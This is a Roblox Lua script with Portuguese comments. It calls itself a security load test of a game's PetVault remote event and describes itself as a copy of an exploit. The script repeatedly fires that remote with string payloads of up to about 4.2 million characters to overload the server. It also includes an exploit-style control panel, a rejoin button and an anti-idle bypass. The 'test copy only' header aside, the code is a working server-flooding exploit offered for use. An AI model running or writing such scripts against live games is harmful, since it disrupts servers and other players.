-- =====================================================
-- TESTE DE CARGA NO PETVAULT - VERSÃO AUTÔNOMA
// Use APENAS na cópia do jogo para testes de segurança
-- =====================================================

-- Carregar serviços
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

-- ========== CONFIGURAÇÕES ==========
local TEST_CONFIG = {
    intensidade = {
        payloadKB = 500,          -- Tamanho do payload (500KB)
        chamadasPorSegundo = 3,    -- Chamadas por segundo
        duracaoSegundos = 20,      -- Duração do teste
    },
    modoTeste = {
        nome = "original",
        descricao = "Cópia do exploit (4.2M caracteres)"
    }
}

-- ========== UI SIMPLES (caso o modelo não carregue) ==========
local function criarUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PetVaultTester"
    screenGui.Parent = Player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Parent = screenGui
    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    frame.Size = UDim2.new(0, 350, 0, 250)
    frame.Position = UDim2.new(0.5, -175, 0.5, -125)
    frame.Active = true
    frame.Draggable = true

    local title = Instance.new("TextLabel")
    title.Parent = frame
    title.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "PetVault Tester"
    title.TextColor3 = Color3.new(0, 1, 0)
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true

    local status = Instance.new("TextLabel")
    status.Parent = frame
    status.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
    status.Size = UDim2.new(1, -10, 0, 30)
    status.Position = UDim2.new(0, 5, 0, 35)
    status.Text = "Status: Pronto"
    status.TextColor3 = Color3.new(1, 1, 1)
    status.TextXAlignment = Enum.TextXAlignment.Left

    -- Botão Teste
    local btnTestar = Instance.new("TextButton")
    btnTestar.Parent = frame
    btnTestar.BackgroundColor3 = Color3.new(0.3, 0.6, 1)
    btnTestar.Size = UDim2.new(0.9, 0, 0, 40)
    btnTestar.Position = UDim2.new(0.05, 0, 0.3, 0)
    btnTestar.Text = "INICIAR TESTE"
    btnTestar.Font = Enum.Font.GothamBold
    btnTestar.TextScaled = true

    -- Botão Modo Leve
    local btnLeve = Instance.new("TextButton")
    btnLeve.Parent = frame
    btnLeve.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
    btnLeve.Size = UDim2.new(0.4, 0, 0, 35)
    btnLeve.Position = UDim2.new(0.05, 0, 0.5, 0)
    btnLeve.Text = "Leve"
    btnLeve.Font = Enum.Font.Gotham

    -- Botão Modo Original
    local btnOriginal = Instance.new("TextButton")
    btnOriginal.Parent = frame
    btnOriginal.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
    btnOriginal.Size = UDim2.new(0.4, 0, 0, 35)
    btnOriginal.Position = UDim2.new(0.55, 0, 0.5, 0)
    btnOriginal.Text = "Original"
    btnOriginal.Font = Enum.Font.Gotham

    -- Botão Rejoin
    local btnRejoin = Instance.new("TextButton")
    btnRejoin.Parent = frame
    btnRejoin.BackgroundColor3 = Color3.new(0.8, 0.6, 0.2)
    btnRejoin.Size = UDim2.new(0.9, 0, 0, 35)
    btnRejoin.Position = UDim2.new(0.05, 0, 0.7, 0)
    btnRejoin.Text = "REJOIN"
    btnRejoin.Font = Enum.Font.GothamBold

    return {
        status = status,
        btnTestar = btnTestar,
        btnLeve = btnLeve,
        btnOriginal = btnOriginal,
        btnRejoin = btnRejoin
    }
end

-- ========== FUNÇÕES DE TESTE ==========

-- Obtém o menor pet (adaptado do script original)
function getLowestPet()
    local success, data = pcall(function()
        return require(ReplicatedStorage.ModuleScripts.LocalDairebStore).GetStoreProxy("GameData"):GetData("Pets")
    end)
    if success and data then
        for _, pet in pairs(data) do
            if not pet.Locked then
                return pet.UID
            end
        end
    end
    return "UID_TESTE_123"
end

-- Gera payload
function gerarPayload(tamanhoKB)
    return string.rep("9", tamanhoKB * 1024)
end

-- Função de teste principal
function testarPetVault(modo)
    local remote = ReplicatedStorage:FindFirstChild("Remote") and ReplicatedStorage.Remote:FindFirstChild("PetVault")
    if not remote then
        ui.status.Text = "Status: PetVault não encontrado!"
        return
    end

    local payload = gerarPayload(TEST_CONFIG.intensidade.payloadKB)
    local totalChamadas = TEST_CONFIG.intensidade.duracaoSegundos * TEST_CONFIG.intensidade.chamadasPorSegundo
    local stats = { chamadas = 0, sucessos = 0, falhas = 0, inicio = os.clock() }

    ui.status.Text = "Status: Testando..."
    for i = 1, totalChamadas do
        stats.chamadas = stats.chamadas + 1
        local ok = pcall(function()
            local petUID = getLowestPet()
            remote:FireServer(petUID, true, payload)
        end)
        if ok then
            stats.sucessos = stats.sucessos + 1
        else
            stats.falhas = stats.falhas + 1
        end
        if i % math.floor(totalChamadas/5) == 0 then
            local perc = math.floor(i/totalChamadas*100)
            ui.status.Text = "Status: " .. perc .. "%"
        end
        wait(1 / TEST_CONFIG.intensidade.chamadasPorSegundo)
    end

    local elapsed = os.clock() - stats.inicio
    local relatorio = string.format("Concluído! Chamadas: %d, Sucessos: %d, Falhas: %d", stats.chamadas, stats.sucessos, stats.falhas)
    ui.status.Text = relatorio
    print(relatorio)
    if stats.falhas == 0 then
        warn("⚠️ VULNERABILIDADE: Todas as chamadas foram aceitas!")
    else
        print("✅ Proteção ativa: servidor rejeitou " .. stats.falhas .. " chamadas.")
    end
end

-- ========== CONECTAR UI ==========
local ui = criarUI()

ui.btnTestar.MouseButton1Click:Connect(function()
    testarPetVault()
end)

ui.btnLeve.MouseButton1Click:Connect(function()
    TEST_CONFIG.intensidade.payloadKB = 100
    TEST_CONFIG.intensidade.chamadasPorSegundo = 2
    TEST_CONFIG.intensidade.duracaoSegundos = 10
    ui.status.Text = "Status: Modo Leve ativado"
end)

ui.btnOriginal.MouseButton1Click:Connect(function()
    TEST_CONFIG.intensidade.payloadKB = 4200  -- 4.2M caracteres
    TEST_CONFIG.intensidade.chamadasPorSegundo = 1
    TEST_CONFIG.intensidade.duracaoSegundos = 5
    ui.status.Text = "Status: Modo Original ativado"
end)

ui.btnRejoin.MouseButton1Click:Connect(function()
    ui.status.Text = "Status: Rejoin em 3s..."
    wait(3)
    TeleportService:Teleport(game.PlaceId, Player)
end)

-- Prevenção de idle
local VirtualUser = game:GetService("VirtualUser")
Player.Idled:connect(function()
    VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    wait(1)
    VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)

print("✅ Script carregado! Use a interface para testar.")
